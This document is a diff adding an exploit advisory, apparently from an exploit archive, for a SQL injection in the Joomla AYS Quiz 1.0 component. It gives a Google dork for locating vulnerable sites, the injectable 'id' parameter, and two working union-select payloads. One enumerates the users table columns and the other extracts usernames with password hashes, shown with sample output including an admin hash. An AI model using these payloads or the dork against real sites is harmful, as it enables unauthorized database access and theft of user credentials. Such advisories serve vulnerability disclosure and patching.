@@ -1,0 +1,29 @@
+# # # # # 
+# Exploit Title: Joomla! Component AYS Quiz v1.0 - SQL Injection
+# Google Dork: inurl:index.php?option=com_aysquiz
+# Date: 04.03.2017
+# Vendor Homepage: http://ays-pro.com/
+# Software Buy: https://extensions.joomla.org/extensions/extension/living/education-a-culture/ays-quiz/
+# Demo: http://demo.ays-pro.com/index.php/ays-quiz
+# Version: 1.0
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[@]ihsan[.]net
+# # # # #
+# SQL Injection/Exploit :
+# http://localhost/[PATH]/index.php/index.php?option=com_aysquiz&controller=question&id=[SQL]&format=raw
+# For example;
+# 1'+/*!50000union*/+select+(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),2,3,4,5-- -&format=raw
+# :title<li>whlzd_users
+# :id<li>whlzd_users
+# :name<li>whlzd_users
+# :username<li>whlzd_users
+# :email<li>whlzd_users
+# :password<li>whlzd_users
+# :block<li>whlzd_users
+# 1'+/*!50000union*/+select+/*!50000concat*/(username,/*!50000char*/(58),password),2,3,4,5+from+whlzd_users-- -&format=raw
+# <input class='ays_radio hide' type='radio'  id='ans_admin:$2y$10$T7Cetq0lrME/gyxxS0usx.bh2OldeDOhccAW7Ikf33.KhbmZbEgfa'
+# Etc...
+# # # # #
